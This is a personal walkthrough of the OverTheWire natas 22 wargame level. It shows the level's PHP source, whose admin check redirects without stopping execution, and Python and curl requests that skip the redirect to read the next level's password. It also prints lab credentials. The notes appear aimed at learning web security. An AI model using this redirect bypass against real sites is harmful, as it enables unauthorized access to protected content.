---
title: natas 22 walkthrough
description: over the wire natas 22
layout: libdoc_page
date: 1111-11-11
eleventyNavigation:
    key: natas-22 OverTheWire CTFs
    parent: OverTheWire CTFs
    title: natas 22 walkthrough
    order: 30
---
## Description
> Username: natas22
> 
> URL:      http://natas22.natas.labs.overthewire.org

### Source Code
```php
<?php
session_start();

if (array_key_exists("revelio", $_GET)) {
    // only admins can reveal the password
    if (!($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1)) {
        header("Location: /");
    }
}
?>

<?php
if (array_key_exists("revelio", $_GET)) {
    print "You are an admin. The credentials for the next level are:<br>";
    print "<pre>Username: natas23\n";
    print "Password: <censored></pre>";
}
?>
```

---
## Progress
### Observation
`revelio` is needed to be added into query while we send a get request. After that, one should get the content below.
### Trial
```python
import requests
from bs4 import BeautifulSoup
from requests.auth import HTTPBasicAuth

username = "natas22"
password = "91awVM9oDiUGm33JdzM7RVLBS8bz9n0s"
authentication = HTTPBasicAuth(username, password)

def get_content(response):
    soup = BeautifulSoup(response.text, 'html.parser')
    content = soup.select('#content')
    return content.__str__()

def main():
    main_url = "http://natas22.natas.labs.overthewire.org/" 
    payload = "?revelio=3" 
    response = requests.get(main_url+payload, auth=authentication)
    if "You are an admin" in get_content(response):
        print(get_content(response))
    else:
        print("failed")

main()
```
I was wrong. I always get status code 200 and an empty page, while I can get the status code 302 (redirection) via chrome. Does python request automatically redirect?
```bash
$ curl --header 'Authorization: Basic bmF0YXMyMjo5MWF3Vk05b0RpVUdtMzNKZHpNN1JWTEJTOGJ6OW4wcw==' --request GET http://natas22.natas.labs.overthewire.org/\?revelio\=3`
```
qjA8cOoKFTzJhtV0Fzvt92fgvxVnVRBj

Well, it seems I guess correctly. The auto redirection can be turned off by setting the argument to false.
```python
response = requests.get(main_url+payload, auth=authentication, allow_redirects=False)
```

---
## Hint

---
## Solving
### Category
- 
### Techniques
- 
### Tools
- 